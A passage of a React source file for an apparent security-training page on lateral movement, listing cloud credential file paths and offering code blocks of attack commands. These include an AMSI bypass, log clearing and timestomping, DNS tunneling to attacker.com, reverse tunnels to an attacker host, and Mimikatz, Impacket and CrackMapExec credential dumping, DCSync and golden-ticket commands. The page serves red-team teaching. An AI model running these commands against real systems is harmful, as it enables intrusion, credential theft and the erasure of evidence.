                  <SecurityIcon sx={{ color: theme.primary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Cloud Credential Locations</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.primary, 0.2)}` }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha(theme.primary, 0.1) }}>
                          <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>Provider</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>Location</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["AWS", "~/.aws/credentials, ~/.aws/config"],
                          ["Azure", "~/.azure/, AccessTokens.json"],
                          ["GCP", "~/.config/gcloud/, application_default_credentials.json"],
                          ["Kubernetes", "~/.kube/config"],
                          ["Docker", "~/.docker/config.json"],
                        ].map(([provider, loc], i) => (
                          <TableRow key={provider} sx={{ bgcolor: i % 2 === 0 ? "transparent" : alpha(theme.primary, 0.03) }}>
                            <TableCell sx={{ color: theme.info, fontWeight: 600 }}>{provider}</TableCell>
                            <TableCell sx={{ color: theme.textMuted, fontFamily: "monospace", fontSize: "0.8rem" }}>{loc}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <CloudIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Common Pivot Paths</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <List dense>
                    {cloudPivotPaths.map((item) => (
                      <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                        <ListItemIcon sx={{ minWidth: 32 }}>
                          <CheckCircleIcon sx={{ color: theme.info, fontSize: 16 }} />
                        </ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <SearchIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Cloud Telemetry to Review</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <List dense>
                    {cloudTelemetry.map((item) => (
                      <ListItem key={item} sx={{ py: 0.5, px: 0 }}>
                        <ListItemIcon sx={{ minWidth: 32 }}>
                          <CheckCircleIcon sx={{ color: theme.success, fontSize: 16 }} />
                        </ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.9rem" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          {/* Tab 6: Evasion */}
          <TabPanel value={tabValue} index={6}>
            <Box sx={{ p: 3 }}>
              <Box sx={{ mb: 4 }}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                  <BugReportIcon sx={{ color: theme.primary }} />
                  <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                    Evasion & OPSEC
                  </Typography>
                </Box>
                <Divider sx={{ mt: 2, borderColor: theme.border }} />
              </Box>

              <Alert severity="warning" sx={{ mb: 4, bgcolor: alpha(theme.warning, 0.1), border: `1px solid ${alpha(theme.warning, 0.3)}` }}>
                Evasion techniques help avoid detection during lateral movement. Always ensure proper authorization.
              </Alert>

              <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
                  <BugReportIcon sx={{ color: theme.primary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>EDR/AV Evasion Concepts</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Grid container spacing={2} sx={{ mb: 3 }}>
                    {[
                      { title: "Living off the Land", desc: "Use built-in tools to blend in", color: theme.info },
                      { title: "Memory-Only", desc: "Avoid touching disk", color: theme.success },
                      { title: "Traffic Blending", desc: "Use common protocols", color: theme.warning },
                      { title: "Time-Based", desc: "Execute during business hours", color: theme.accent },
                    ].map((item) => (
                      <Grid item xs={6} md={3} key={item.title}>
                        <Paper sx={{ p: 2, bgcolor: theme.bgNested, border: `1px solid ${alpha(item.color, 0.3)}`, borderRadius: 2, position: "relative", "&::before": { content: '""', position: "absolute", top: 0, left: 0, right: 0, height: "3px", bgcolor: item.color }, overflow: "hidden" }}>
                          <Typography sx={{ color: item.color, fontWeight: 700 }}>{item.title}</Typography>
                          <Typography variant="caption" sx={{ color: theme.textMuted }}>{item.desc}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <SecurityIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>AMSI & ETW Bypass</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="PowerShell Evasion"
                    code={`# AMSI bypass (patching amsi.dll)
# Note: Signatures change frequently - these are conceptual
$a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$b.SetValue($null,[IntPtr]::Zero)

# Script block logging bypass
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static")
$settings.SetValue($null, @{})

# ETW patching
# Prevents PowerShell logging to Event Tracing for Windows`}
                  />
                  <Alert severity="info" sx={{ mt: 2, bgcolor: alpha(theme.info, 0.1), border: `1px solid ${alpha(theme.info, 0.3)}` }}>
                    AMSI/ETW bypasses are frequently detected and patched. Always test in a lab environment first.
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <TerminalIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Log Evasion & Cleanup</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="Log Management"
                    code={`# View Windows Security logs
wevtutil qe Security /c:50 /f:text

# Clear specific log
wevtutil cl Security
wevtutil cl System
wevtutil cl "Windows PowerShell"

# Disable logging temporarily (requires admin)
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable

# Linux log cleanup
echo "" > /var/log/auth.log
history -c
export HISTFILE=/dev/null
unset HISTFILE

# Timestomp files (change timestamps)
touch -t 202301011200 malicious.exe`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.accent)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
                  <AccountTreeIcon sx={{ color: theme.accent, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Network Traffic Blending</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="Traffic Techniques"
                    code={`# DNS tunneling
dnscat2 --dns server=attacker.com
iodine -f attacker.com

# HTTP/HTTPS C2
# Use common user agents
# Beacon to legitimate-looking domains
# Use proper SSL certificates

# Domain fronting (limited availability)
# Leverage CDN to hide C2

# SMB named pipes
# Blend with normal Windows traffic

# Timing and jitter
# Randomize beacon intervals
# Execute during business hours`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <CheckCircleIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>OPSEC Best Practices</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <Grid container spacing={2}>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: theme.bgNested, border: `1px solid ${alpha(theme.success, 0.3)}`, borderRadius: 2 }}>
                        <Typography sx={{ color: theme.success, fontWeight: 700, mb: 1 }}>Do</Typography>
                        <List dense>
                          {["Use encrypted channels", "Blend with normal traffic", "Work during business hours", "Clean up artifacts", "Use proxy chains"].map((item) => (
                            <ListItem key={item} sx={{ py: 0.25 }}>
                              <ListItemIcon sx={{ minWidth: 28 }}><CheckCircleIcon sx={{ color: theme.success, fontSize: 16 }} /></ListItemIcon>
                              <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.85rem" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: theme.bgNested, border: `1px solid ${alpha(theme.primary, 0.3)}`, borderRadius: 2 }}>
                        <Typography sx={{ color: theme.primary, fontWeight: 700, mb: 1 }}>Don't</Typography>
                        <List dense>
                          {["Use default tool signatures", "Move too fast", "Leave tools on disk", "Ignore logging", "Reuse compromised accounts"].map((item) => (
                            <ListItem key={item} sx={{ py: 0.25 }}>
                              <ListItemIcon sx={{ minWidth: 28 }}><WarningIcon sx={{ color: theme.primary, fontSize: 16 }} /></ListItemIcon>
                              <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: theme.textMuted, fontSize: "0.85rem" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                  </Grid>
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          {/* Tab 7: Tools */}
          <TabPanel value={tabValue} index={7}>
            <Box sx={{ p: 3 }}>
              <Box sx={{ mb: 4 }}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                  <BuildIcon sx={{ color: theme.primary }} />
                  <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.secondary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                    Lateral Movement Tools Reference
                  </Typography>
                </Box>
                <Divider sx={{ mt: 2, borderColor: theme.border }} />
              </Box>

              <Accordion defaultExpanded sx={accordionSx(theme.primary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.primary }} />} sx={accordionSummarySx(theme.primary)}>
                  <BuildIcon sx={{ color: theme.primary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Essential Tools Matrix</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <TableContainer component={Paper} sx={{ bgcolor: "transparent", borderRadius: 2, border: `1px solid ${alpha(theme.primary, 0.2)}` }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha(theme.primary, 0.1) }}>
                          <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>Tool</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>Type</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>Platform</TableCell>
                          <TableCell sx={{ color: theme.primary, fontWeight: 700 }}>Best For</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["Impacket", "Python Scripts", "Linux/Win", "SMB, WMI, DCOM, Kerberos attacks"],
                          ["CrackMapExec", "Swiss Army Knife", "Linux", "Mass credential testing, enumeration"],
                          ["Mimikatz", "Credential Tool", "Windows", "Credential dumping, PtH, Golden ticket"],
                          ["Rubeus", "Kerberos Tool", "Windows", "Kerberos attacks, ticket manipulation"],
                          ["BloodHound", "AD Mapper", "Multi", "Attack path analysis, AD enumeration"],
                          ["Evil-WinRM", "WinRM Shell", "Linux", "Interactive WinRM with PtH support"],
                          ["Cobalt Strike", "C2 Framework", "Multi", "Full red team operations"],
                          ["Metasploit", "Exploit Framework", "Multi", "Exploitation, pivoting, post-exploitation"],
                          ["PowerView", "AD Recon", "Windows", "PowerShell AD enumeration"],
                          ["SharpHound", "AD Collector", "Windows", "BloodHound data collection"],
                          ["Chisel", "Tunneling", "Multi", "HTTP tunneling, port forwarding"],
                          ["Ligolo-ng", "Tunneling", "Multi", "Network pivoting without SOCKS"],
                        ].map(([tool, type, platform, best], i) => (
                          <TableRow key={tool} sx={{ bgcolor: i % 2 === 0 ? "transparent" : alpha(theme.primary, 0.03), "&:hover": { bgcolor: alpha(theme.primary, 0.08) } }}>
                            <TableCell sx={{ color: theme.info, fontWeight: 700 }}>{tool}</TableCell>
                            <TableCell sx={{ color: theme.text }}>{type}</TableCell>
                            <TableCell><Chip label={platform} size="small" sx={{ bgcolor: alpha(theme.accent, 0.2), color: theme.accent }} /></TableCell>
                            <TableCell sx={{ color: theme.textMuted, fontSize: "0.85rem" }}>{best}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.accent)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.accent }} />} sx={accordionSummarySx(theme.accent)}>
                  <TerminalIcon sx={{ color: theme.accent, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Impacket Suite</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="Impacket Tools"
                    code={`# Remote Execution
psexec.py DOMAIN/user:password@TARGET
smbexec.py DOMAIN/user:password@TARGET
wmiexec.py DOMAIN/user:password@TARGET
atexec.py DOMAIN/user:password@TARGET "command"
dcomexec.py DOMAIN/user:password@TARGET

# Credential Dumping
secretsdump.py DOMAIN/user:password@TARGET
secretsdump.py -just-dc DOMAIN/user:password@DC

# Kerberos
getTGT.py DOMAIN/user:password
getST.py -spn SERVICE/target DOMAIN/user:password
GetUserSPNs.py DOMAIN/user:password -dc-ip DC -request
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC

# SMB Operations
smbclient.py DOMAIN/user:password@TARGET
lookupsid.py DOMAIN/user:password@TARGET`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.warning)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.warning }} />} sx={accordionSummarySx(theme.warning)}>
                  <VpnKeyIcon sx={{ color: theme.warning, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Mimikatz Commands</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="Mimikatz Usage"
                    code={`# Enable debug privilege
privilege::debug

# Dump credentials from LSASS
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::kerberos

# Dump SAM database
lsadump::sam
lsadump::secrets
lsadump::cache

# DCSync attack
lsadump::dcsync /user:DOMAIN\\Administrator
lsadump::dcsync /all /csv

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# Golden Ticket
kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Export tickets
sekurlsa::tickets /export
kerberos::list /export

# Pass-the-Ticket
kerberos::ptt ticket.kirbi`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.info)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.info }} />} sx={accordionSummarySx(theme.info)}>
                  <TerminalIcon sx={{ color: theme.info, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>CrackMapExec</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="CrackMapExec (CME/NetExec)"
                    code={`# SMB Enumeration
crackmapexec smb TARGETS
crackmapexec smb TARGETS -u user -p password
crackmapexec smb TARGETS -u user -H NTLM_HASH

# Command Execution
crackmapexec smb TARGET -u user -p pass -x "whoami"
crackmapexec smb TARGET -u user -p pass -X "Get-Process"  # PowerShell

# Credential Dumping
crackmapexec smb TARGET -u user -p pass --sam
crackmapexec smb TARGET -u user -p pass --lsa
crackmapexec smb TARGET -u user -p pass --ntds

# Share Enumeration
crackmapexec smb TARGET -u user -p pass --shares
crackmapexec smb TARGET -u user -p pass --spider C$ --pattern password

# WinRM
crackmapexec winrm TARGET -u user -p pass -x "whoami"

# MSSQL
crackmapexec mssql TARGET -u user -p pass -q "SELECT @@version"`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.success)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.success }} />} sx={accordionSummarySx(theme.success)}>
                  <AccountTreeIcon sx={{ color: theme.success, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>BloodHound & SharpHound</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="powershell"
                    title="BloodHound Collection"
                    code={`# SharpHound - Collect all data
SharpHound.exe -c All
SharpHound.exe -c All --zipfilename output.zip

# Specific collection methods
SharpHound.exe -c Session,LoggedOn  # Active sessions
SharpHound.exe -c ACL              # Access Control Lists
SharpHound.exe -c Trusts           # Domain trusts

# Python bloodhound (from Linux)
bloodhound-python -u user -p password -d domain.local -dc dc.domain.local -c All

# Useful Cypher queries in BloodHound
# Find shortest path to Domain Admin
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Find computers where Domain Users can RDP
MATCH (g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:CanRDP]->(c:Computer) RETURN c`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={accordionSx(theme.secondary)}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: theme.secondary }} />} sx={accordionSummarySx(theme.secondary)}>
                  <SecurityIcon sx={{ color: theme.secondary, mr: 1.5 }} />
                  <Typography variant="h6" sx={{ fontWeight: 600, color: theme.text }}>Tunneling Tools</Typography>
                </AccordionSummary>
                <AccordionDetails sx={{ pt: 3 }}>
                  <CodeBlock
                    language="bash"
                    title="Pivoting & Tunneling"
                    code={`# Chisel - HTTP Tunneling
# Server (attacker)
chisel server -p 8080 --reverse

# Client (victim)
chisel client ATTACKER:8080 R:1080:socks

# Ligolo-ng - Agent-based pivoting
# Proxy (attacker)
./proxy -selfcert

# Agent (victim)
./agent -connect ATTACKER:11601 -ignore-cert

# SSH SOCKS Proxy
ssh -D 1080 -N user@jump-host

# Proxychains
proxychains nmap -sT TARGET
proxychains crackmapexec smb TARGET`}
                  />
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>
        </Paper>
        <Paper
          id="quiz-section"
          sx={{
            mt: 4,
            p: 4,
            borderRadius: 3,
            border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
            Knowledge Check
          </Typography>
          <QuizSection
            questions={quizQuestions}
            accentColor={QUIZ_ACCENT_COLOR}
            title="Lateral Movement Knowledge Check"
            description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
            questionsPerQuiz={QUIZ_QUESTION_COUNT}
          />
        </Paper>
        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: "#f97316", color: "#f97316" }}
          >
            Back to Learning Hub
          </Button>
        </Box>
      </Container>
    </Box>
    </LearnPageLayout>
  );
};

export default LateralMovementPage;
